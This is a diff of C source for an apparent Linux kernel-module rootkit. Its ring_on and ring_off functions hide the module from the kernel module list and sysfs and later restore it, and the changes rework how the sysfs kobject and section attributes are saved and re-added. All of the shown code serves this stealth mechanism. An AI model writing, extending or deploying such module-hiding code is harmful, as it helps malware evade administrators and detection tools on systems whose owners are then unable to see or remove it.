@@ -10,6 +10,8 @@ static struct list_head *_module_list = NULL;
 static struct kobject *_kobj          = NULL;
 static struct kobject *_kobj_parent   = NULL;
 static struct kobject *_kobj_holder   = NULL;
+static struct module_sect_attrs *_sect_attrs = NULL;
+static struct module_notes_attrs *_notes_attrs = NULL;
 static struct attribute_group *_kgrp  = NULL;
 static const struct file_operations fops = {
     .owner      = THIS_MODULE,
@@ -89,7 +91,10 @@ void ring_on(void)
     _kgrp = &(__this_module.sect_attrs->grp);       /* Remember sysfs group */
     _kobj_holder = THIS_MODULE->holders_dir;
     _kobj_parent = __this_module.mkobj.kobj.parent; /* Remember kobject parent */
-    kobject_del(&__this_module.mkobj.kobj);         /* Remove from sysfs */
+    //kobject_del(&__this_module.mkobj.kobj);         /* Remove from sysfs */
+
+    _sect_attrs = THIS_MODULE->sect_attrs;
+    _notes_attrs = THIS_MODULE->notes_attrs;
 
     printk("The ring of power is applied.\n");
 }
@@ -100,19 +105,21 @@ void ring_off(void)
     /* Add the LKM back into the system module list */
     list_add(&__this_module.list, _module_list);
     barrier();
-
+/*
     if (kobject_add(_kobj, _kobj_parent, "eye") == -EINVAL)
     {
         kobject_put(_kobj);
         return;
     }
-
+*/
     /* Add the LKM back into the sysfs group */
+/*
+    THIS_MODULE->sect_attrs = _sect_attrs;
+    THIS_MODULE->notes_attrs = _notes_attrs;
 
     kobject_add(_kobj_holder, _kobj, "holders");
-
     sysfs_create_group(_kobj, _kgrp);
     kobject_uevent(_kobj, KOBJ_ADD);
-
+*/
     printk("The ring of power is removed.\n");
 }
